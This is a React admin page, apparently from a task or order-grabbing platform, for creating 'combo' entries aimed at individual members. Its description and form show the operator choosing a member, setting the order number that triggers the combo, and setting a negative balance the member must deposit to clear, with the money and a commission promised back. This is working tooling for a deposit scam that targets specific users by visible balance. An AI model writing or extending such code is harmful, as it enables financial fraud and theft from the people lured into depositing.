"use client";
import { useEffect, useState } from "react";
import Shell from "@/components/Shell";
import { api } from "@/lib/api";

export default function Combos() {
  const [items, setItems] = useState([]);
  const [members, setMembers] = useState([]);
  const [q, setQ] = useState("");
  const [f, setF] = useState({ userId: "", comboAt: 1, negativeAmount: 500, commission: 20 });
  const [msg, setMsg] = useState("");

  async function load() { setItems((await api("/api/admin/combos")).items || []); }
  useEffect(() => { load(); }, []);
  async function search() {
    const d = await api(`/api/admin/users${q.trim() ? "?q=" + encodeURIComponent(q.trim()) : ""}`);
    setMembers(d.items.slice(0, 20));
  }
  async function create() {
    setMsg("");
    try {
      await api("/api/admin/combos", { method: "POST", body: { userId: f.userId, comboAt: Number(f.comboAt), negativeAmount: Number(f.negativeAmount), commission: Number(f.commission) } });
      setMsg("combo created ✓"); await load();
    } catch (e) { setMsg(e.message); }
  }
  async function del(id) { if (confirm("Delete this combo?")) { await api(`/api/admin/combos/${id}`, { method: "DELETE" }); await load(); } }

  return (
    <Shell>
      <h1 className="text-2xl text-gold font-display mb-1">Combos</h1>
      <p className="text-cream/50 text-sm mb-4">Plant a forced-deposit "combo lot" in a member's analyst flow. When the member reaches order #<b>comboAt</b> of the day, it triggers: their balance is driven to −negativeAmount, they must deposit to clear, then complete it to get the full amount back plus the combo commission.</p>

      <div className="grid lg:grid-cols-3 gap-4">
        <div className="card p-4 space-y-3 h-max">
          <div className="text-gold">New combo</div>
          <div className="flex gap-2">
            <input value={q} onChange={e => setQ(e.target.value)} onKeyDown={e => e.key === "Enter" && search()} placeholder="Find member (email / #)" className="flex-1 text-sm" />
            <button className="btn text-sm" onClick={search}>Find</button>
          </div>
          {!!members.length && (
            <select value={f.userId} onChange={e => setF({ ...f, userId: e.target.value })} className="w-full text-sm">
              <option value="">— select member —</option>
              {members.map(m => <option key={m._id} value={m._id}>{m.username || m.email} (#{m.accountNumber ?? "?"}) · ${(m.balance ?? 0).toFixed(0)}</option>)}
            </select>
          )}
          <label className="text-sm block">Trigger at order # (today)<input type="number" min={1} className="w-full mt-1" value={f.comboAt} onChange={e => setF({ ...f, comboAt: e.target.value })} /></label>
          <label className="text-sm block">Negative amount $ (deficit to recharge)<input type="number" min={1} className="w-full mt-1" value={f.negativeAmount} onChange={e => setF({ ...f, negativeAmount: e.target.value })} /></label>
          <label className="text-sm block">Commission %<input type="number" min={1} className="w-full mt-1" value={f.commission} onChange={e => setF({ ...f, commission: e.target.value })} /></label>
          <button className="btn w-full" disabled={!f.userId} onClick={create}>Create combo</button>
          {msg && <div className="text-cream/60 text-sm">{msg}</div>}
        </div>

        <div className="card overflow-x-auto lg:col-span-2">
          <table>
            <thead><tr className="text-cream/60"><th>Member</th><th>At #</th><th>Negative</th><th>Comm %</th><th>Status</th><th></th></tr></thead>
            <tbody>
              {items.map(c => (
                <tr key={c._id}>
                  <td>{c.user?.username || c.user?.email || "—"}</td>
                  <td>{c.comboAt}</td><td>${c.negativeAmount}</td><td>{c.commission}%</td>
                  <td><span className={`chip ${c.status === "completed" ? "text-emerald-500" : c.status === "active" ? "text-amber-600" : "text-cream/60"}`}>{c.status}</span></td>
                  <td><button className="btn-ghost text-xs" onClick={() => del(c._id)}>Delete</button></td>
                </tr>
              ))}
              {!items.length && <tr><td colSpan={6} className="text-cream/50 py-4">No combos.</td></tr>}
            </tbody>
          </table>
        </div>
      </div>
    </Shell>
  );
}
